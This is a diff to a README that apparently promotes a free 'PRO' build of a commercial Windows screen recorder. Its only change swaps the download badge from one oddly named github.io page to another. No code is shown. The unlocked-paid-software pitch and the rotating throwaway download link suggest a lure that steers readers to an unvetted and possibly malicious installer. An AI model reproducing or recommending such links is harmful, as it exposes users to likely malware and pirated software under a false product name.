@@ -2,7 +2,7 @@
 
 Icecream Screen Recorder PRO is an advanced screen recording utility for Windows that enables seamless video capturing, audio recording, and screen annotations — all without watermarks or export limitations.
 
-[![Download](https://img.shields.io/badge/⬇️%20Download-Icecream_Screen_Recorder_Utility-brightgreen?style=for-the-badge)](https://icecream-screen-recorder-pro-download.github.io/.github/)
+[![Download](https://img.shields.io/badge/⬇️%20Download-Icecream_Screen_Recorder_Utility-brightgreen?style=for-the-badge)](https://screenicerecweb009down.github.io/.github/)
 
 ---
 
